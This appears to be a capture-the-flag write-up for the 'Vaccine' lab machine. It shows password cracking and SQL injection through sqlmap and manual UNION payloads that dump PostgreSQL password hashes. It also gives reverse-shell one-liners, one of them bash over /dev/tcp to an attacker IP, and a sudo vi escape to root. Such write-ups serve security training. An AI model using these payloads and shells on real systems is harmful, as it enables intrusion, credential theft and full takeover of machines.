* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)
* [Discoveries](#discoveries)  

![alt text](./img/vaccine.PNG?raw=true)  

## Recon-Enumeration  
![alt text](./img/vaccine01.PNG?raw=true)  

![alt text](./img/vaccine02.PNG?raw=true)  

Let’s try to use the credentials found in the OOPSIE machine  
![alt text](./img/vaccine03.PNG?raw=true)  
  
Here we can only find one zip file. Let’s get it and try to unzip  
![alt text](./img/vaccine04.PNG?raw=true)  

This was unexpected…..however this password can be easily cracked with John…  
![alt text](./img/vaccine05.PNG?raw=true)  

Using the password we can unzip the file and get 2 other files: index.php and style.css  
Inside the index.php file we can find a username and a password hash  
![alt text](./img/vaccine06.PNG?raw=true)  

This hash is easier to crack, just use [crackstation](https://crackstation.net/)  
![alt text](./img/vaccine07.PNG?raw=true)  

Now we can login and access the server  

## Exploit  
![alt text](./img/vaccine08.PNG?raw=true)  

Here the SEARCH param is vulnerable to sqli  
![alt text](./img/vaccine09.PNG?raw=true)  
  
Here we can use SQLMAP or do the SQLi manually.  
> SQLMAP  
sqlmap -u http://10.10.10.46/dashboard.php?search=elixir --cookie PHPSESSID=qihiab8965c78chkp3u245b13e --dbs  
sqlmap -u http://10.10.10.46/dashboard.php?search=elixir --cookie PHPSESSID=qihiab8965c78chkp3u245b13e -D pg_catalog --tables  
sqlmap -u http://10.10.10.46/dashboard.php?search=elixir --cookie PHPSESSID=qihiab8965c78chkp3u245b13e -D pg_catalog -T pg_authid --dump  
![alt text](./img/vaccine10.PNG?raw=true)  

> Manually  
http://10.10.10.46/dashboard.php?search=elixir%27%20union%20all%20select%20NULL,table_name,NULL,NULL,NULL%20from%20information_schema.tables--  
http://10.10.10.46/dashboard.php?search=elixir%27%20union%20all%20select%20NULL,column_name,NULL,NULL,NULL%20from%20information_schema.columns%20where%20table_name=%27pg_authid%27--  
http://10.10.10.46/dashboard.php?search=elixir%27%20union%20all%20select%20NULL,rolname,rolpassword,NULL,NULL%20from%20pg_authid--  
![alt text](./img/vaccine12.PNG?raw=true)  

I tried crack this hash with john and hashcat, however a quick google search could saved some time  
![alt text](./img/vaccine11.PNG?raw=true)  

With this credential we can connect to port 22 of this server:  
PS: we could use the sqlmap flag --os-shell to gain a shell and after gain an upgraded reverse shell with the next commands. However i lost the connection sometimes with this method  
sqlmap -u http://10.10.10.46/dashboard.php?search=elixir --cookie PHPSESSID=qihiab8965c78chkp3u245b13e --os-shell  
Attacker box: nc -nvlp 1234  
Victim box: RHOST=10.10.16.82; RPORT=1234; TF=$(mktemp -u); mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF &  
Attacker box: nc -nvlp 4444  
Victim box: bash -c 'exec bash -i &>/dev/tcp/10.10.16.82/4444 <&1' &  
![alt text](./img/vaccine13.PNG?raw=true)  
HABEMUS SHELL \o/

## Privesc  
![alt text](./img/vaccine14.PNG?raw=true)  

Look’s like we can run the command “/bin/vi /etc/postgresql/11/main/pg_hba.conf” as sudo, so we can get root:  
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf  
PRESS ESC KEY  
:set shell=/bin/sh  
:shell  
![alt text](./img/vaccine15.PNG?raw=true)  

## Discoveries  
cd /var/lib/postgresql/.ssh  
![alt text](./img/vaccine17.PNG?raw=true)  

/etc/shadow  
![alt text](./img/vaccine16.PNG?raw=true)  
